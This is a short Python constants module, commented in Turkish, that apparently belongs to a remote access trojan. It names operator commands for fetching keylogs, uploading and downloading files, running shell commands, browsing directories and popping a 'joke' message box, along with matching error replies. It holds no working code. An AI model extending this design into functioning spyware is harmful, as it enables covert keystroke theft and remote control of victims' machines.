#!/usr/bin/env python3

# -*- encoding: utf-8 -*-

# bu modül istenen komutları handle(işlemek için oluşturulmuştur)

class Commands:
    """
    Bu karşı tarafa gönderilecek olan komutlardır
    """
    COMMAND_DO_GET_CLIENT_IS_ONLINE = "client_are_you_online"
    COMMAND_DO_GET_KEYLOGS = "get_keylog"
    COMMAND_DO_UPLOAD = "upload"
    COMMAND_DO_DOWNLOAD = "download"
    COMMAND_DO_SHELL_EXEC = "shell_exec"
    COMMAND_DO_LIST_CURRENT_PATH = "list_current_path"
    COMMAND_DO_CD_PATH = "cd_path"
    COMMAND_DO_GET_PWD = "get_pwd"
    COMMAND_DO_JOKE_MSGBOX = "joke_msgbox"

    COMMAND_CLIENT_ONLINE = "online"
class ErrorMessages:
    """
    Burası ise karşı taraftan gelen olumsuz komutlar içindir
    """
    ERR_MSG_MSG_IS_EMPTY = "ERR_MSG_MSG_IS_EMPTY"
    ERR_MSG_I_CANT_GET_KEYLOGS = "ERR_MSG_I_CANT_GET_KEYLOGS"
    ERR_MSG_I_CANT_DO_UPLOAD = "ERR_MSG_I_CANT_DO_UPLOAD"
    ERR_MSG_I_CANT_DO_DOWNLOAD = "ERR_MSG_I_CANT_DO_DOWNLOAD"
    ERR_MSG_I_CANT_DO_SHELL_EXEC = "ERR_MSG_I_CANT_DO_SHELL_EXEC"
    ERR_MSG_I_CANT_DO_LIST_CURRENT_PATH = "ERR_MSG_I_CANT_DO_LIST_CURRENT_PATH"
    ERR_MSG_I_CANT_DO_CD_PATH = "ERR_MSG_I_CANT_DO_CD_PATH"
    ERR_MSG_I_CANT_DO_GET_PWD = "ERR_MSG_I_CANT_DO_GET_PWD"
    ERR_MSG_I_CANT_DO_JOKE_MSGBOX = "ERR_MSG_I_CANT_DO_JOKE_MSGBOX"

    ERR_MSG_CLIENT_NOT_ONLINE = "client_is_not_online"
"""class GetCommand:
    def __new__(self,command: str) -> str:
        self.dict = {
            "1":Commands.COMMAND_DO_GET_KEYLOGS,
            "2":
        }
"""